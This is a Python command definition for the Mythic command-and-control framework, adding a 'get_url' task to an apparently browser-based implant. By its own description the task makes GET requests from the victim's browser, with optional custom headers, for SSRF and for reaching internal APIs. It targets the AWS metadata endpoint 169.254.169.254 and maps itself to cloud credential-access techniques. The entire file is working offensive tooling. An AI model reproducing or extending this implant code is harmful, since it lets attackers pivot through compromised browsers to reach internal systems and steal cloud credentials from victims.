from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class GetUrlArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL to fetch (e.g. http://169.254.169.254/latest/meta-data/)",
            ),
            CommandParameter(
                name="headers",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="",
                description='Custom headers as JSON object (e.g. {"Authorization": "Bearer xxx"})',
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a URL")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class GetUrlCommand(CommandBase):
    cmd = "get_url"
    needs_admin = False
    help_cmd = "get_url http://169.254.169.254/latest/meta-data/"
    description = "Make a GET request from the victim's browser with optional custom headers. Useful for SSRF, AWS metadata, internal APIs."
    version = 1
    author = "@grampae"
    attackmapping = ["T1090", "T1552.005"]
    argument_class = GetUrlArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = "GET {}".format(task.args.get_arg("url"))
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
